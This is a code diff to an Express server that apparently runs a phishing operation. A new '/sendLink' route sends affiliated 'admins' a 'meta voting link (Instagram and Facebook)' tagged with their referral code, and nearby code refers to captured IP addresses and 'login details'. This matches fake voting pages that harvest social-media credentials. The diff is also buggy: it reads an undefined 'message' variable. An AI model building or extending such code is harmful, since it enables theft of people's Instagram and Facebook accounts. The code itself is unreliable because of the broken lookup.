@@ -38,7 +38,9 @@ const allowedOrigins = [
    'http://localhost:8080',
    "https://marsdove-nd.netlify.app"
 ];
-
+const links = {
+  meta_voting:"https://friendly-chaja-62dab6.netlify.app"
+}
 app.use(cors({
   origin: function(origin, callback) {
     // allow requests with no origin (like mobile apps, curl)
@@ -669,19 +671,24 @@ IP: *${escapeMarkdown(ip || "Location only comes with login details now")}*
 });
 
 
-app.post("/sendMessage", verifyToken, async (req, res) => {
+app.post("/sendLink", verifyToken, async (req, res) => {
   try {
     const admin = await Admin.findById(req.userId);
     if (!admin) {
-      console.warn("sendMessage: Admin not found");
+      console.warn("sendLink: Admin not found");
       return res.status(404).json({
         success: false,
-        message: "Failed to send message. Admin not found."
+        message: "Failed to send link. Admin not found."
       });
     }
-
-    const { message } = req.body;
-    const text = message?.trim() || "No message was received";
+    const { name} = req.body;
+    const link = links[message];
+    const text = `
+    This is your meta voting link(Instagram and Facebook)  👉 ${link}?ref=${admin.referralCode}
+    
+    
+    Received from Marsdove to ${admin.firstname} ${admin.lastname}
+    `;
 
     await sendTelegram(admin.chatId, text);
 
